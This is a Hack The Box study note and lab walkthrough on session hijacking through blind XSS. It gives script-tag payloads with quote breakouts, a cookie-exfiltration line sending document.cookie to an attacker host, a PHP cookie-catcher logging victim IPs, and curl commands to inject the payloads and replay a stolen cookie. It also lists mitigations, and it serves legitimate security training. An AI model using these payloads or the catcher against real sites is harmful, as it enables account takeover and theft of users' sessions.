# Section 8 — Session Hijacking via XSS

---

## Attack Concept

Steal the victim's session cookie via JavaScript, set it in the attacker's browser, and become the victim. No password is ever needed.

This works because:
- `document.cookie` returns all non-`HttpOnly` cookies for the current origin.
- Cookies alone authenticate most session-based apps.
- The attacker can replay the cookie from anywhere with network access.

> Mitigation: set session cookies `HttpOnly` (JS can't read them) + `Secure` (HTTPS only) + `SameSite=Strict`.

---

## Blind XSS

Blind XSS (Cross-Site Scripting) is triggered on a page the attacker cannot see. It usually fires in an admin panel that reviews user-submitted data. Common locations include contact forms, user registration fields, support tickets, review submissions, and HTTP headers like `User-Agent` or `Referer` that are reflected in admin logs.

Detection is indirect. Inject a payload that fires an HTTP request back to your server. If you see the callback, the page is vulnerable.

---

## Identifying the Vulnerable Field

Use a remote-script payload with a **unique path per field**:

```html
fullname: <script src=http://ATTACKER/fullname></script>
username: <script src=http://ATTACKER/username></script>
imgurl:   <script src=http://ATTACKER/imgurl></script>
```
> Each field gets a unique path. When the admin views the submission, the request that arrives at your server reveals which field is vulnerable. Replace `ATTACKER` with your tun0 IP and port.

When the admin bot views the submission, the script that fires reveals which field is vulnerable by the path in the callback.

**Skip these fields:**
- `email` — validated by regex on both front and back end
- `password` — hashed before storage and never displayed

---

## Common Blind XSS Payloads

```html
<script src=http://ATTACKER/></script>
"><script src=http://ATTACKER/></script>
'><script src=http://ATTACKER/></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://ATTACKER\';document.body.appendChild(a)')
<script>$.getScript("http://ATTACKER")</script>
```
> Test each breakout prefix (`"`, `'`, or no prefix) with every field. The prefix depends on how the admin panel renders the value — inside a double-quoted attribute, single-quoted attribute, or raw HTML.

Test each with all fields.

---

## Cookie Exfiltration Payload

`script.js` on attacker server:
```javascript
new Image().src='http://ATTACKER/index.php?c='+document.cookie
```
> Sends all accessible cookies to your server as a URL parameter. `new Image().src` causes only a silent HTTP request — no navigation, no visible redirect.

Cookie catcher `index.php`:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
> Receives the cookie string, splits it on semicolons (one cookie per line), URL-decodes each value, then appends them to `cookies.txt` with the victim's IP. Place this file in the same directory as `script.js` before starting your PHP server.

The `explode(";", ...)` splits multiple cookies onto separate lines — handy when the victim has many cookies set.

---

## Using the Stolen Cookie

In Firefox: `Shift+F9` → Storage tab → add cookie with Name = `cookie`, Value = stolen string → refresh.

Or via curl:
```bash
curl -sk "http://TARGET/admin/" -H "Cookie: name=value"
```
> Replays the stolen session cookie in a curl request. Replace `name=value` with the cookie name and value from `cookies.txt`. This authenticates as the victim without a password.

---

## Lab — Session Hijacking

**Target:** `10.129.96.115` (HTB VPN), path `/hijacking/`

Form fields: `fullname`, `username`, `password`, `email`, `imgurl`. (Same form as Section 5 + an extra `imgurl` field.)

### Step 1 — Listener

```bash
mkdir /tmp/xss_hijack && cd /tmp/xss_hijack

cat > index.php << 'EOF'
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("/tmp/xss_hijack/cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
EOF

cat > script.js << 'EOF'
new Image().src='http://10.10.17.176:8080/index.php?c='+document.cookie
EOF

php -S 0.0.0.0:8080 &
```
> Creates the cookie-catcher PHP page plus the `script.js` exfil payload and starts a background PHP server on port 8080 — swap the attacker IP:port for your tun0 address.

### Step 2 — Field probe (find vulnerable input)

```bash
# First try: bare <script src=...> in each field — no hits (admin panel HTML-encodes?)
# Second try: add breakouts. ">  fires for imgurl.
curl -sk -G "http://10.129.96.115/hijacking/index.php" \
  --data-urlencode 'fullname="><script src=http://10.10.17.176:8080/fullname_dq></script>' \
  --data-urlencode "username='><script src=http://10.10.17.176:8080/username_sq></script>" \
  --data-urlencode "password=test12345" \
  --data-urlencode "email=test@test.com" \
  --data-urlencode 'imgurl="><script src=http://10.10.17.176:8080/imgurl_dq></script>'
```
> Submits a blind-XSS probe with a unique callback path per field so the listener path that fires identifies the vulnerable input — swap the attacker IP:port and target URL for your environment.

Listener fires `GET /imgurl_dq` → **`imgurl` is the vulnerable field**, breakout is `">`.

### Step 3 — Send cookie-stealing payload

```bash
curl -sk -G "http://10.129.96.115/hijacking/index.php" \
  --data-urlencode "fullname=Alice" \
  --data-urlencode "username=alice99" \
  --data-urlencode "password=test12345" \
  --data-urlencode "email=alice@test.com" \
  --data-urlencode 'imgurl="><script src=http://10.10.17.176:8080/script.js></script>'
```
> Submits the cookie-stealing payload in the confirmed vulnerable `imgurl` field so the admin bot loads `script.js` — swap the attacker IP:port and target URL for your environment.

Wait for admin bot. `cookies.txt`:
```
Victim IP: 10.129.96.115 | Cookie: cookie=c00k1355h0u1d8353cu23d
```

### Step 4 — Replay the cookie

```bash
curl -sk "http://10.129.96.115/hijacking/login.php" \
  -H "Cookie: cookie=c00k1355h0u1d8353cu23d"
# → Welcome Back Admin
# → HTB{4lw4y5_53cur3_y0ur_c00k135}
```

**Flag:** `HTB{4lw4y5_53cur3_y0ur_c00k135}`

---

## Exam Notes

- Blind XSS detection = unique-path-per-field trick — turns the "which field?" question into "which callback path?"
- `<script src=...>` payloads need to break out of the surrounding HTML context — try `'>`, `">`, raw injection variants
- Skip `email` (validated) and `password` (hashed) — wastes probes
- `new Image().src` over `document.location` — silent vs. visible redirect
- Stolen cookie + curl `-H "Cookie: ..."` = instant session replay, no Firefox needed
- Production fix: `HttpOnly` flag on session cookies — single most important XSS-cookie-theft mitigation
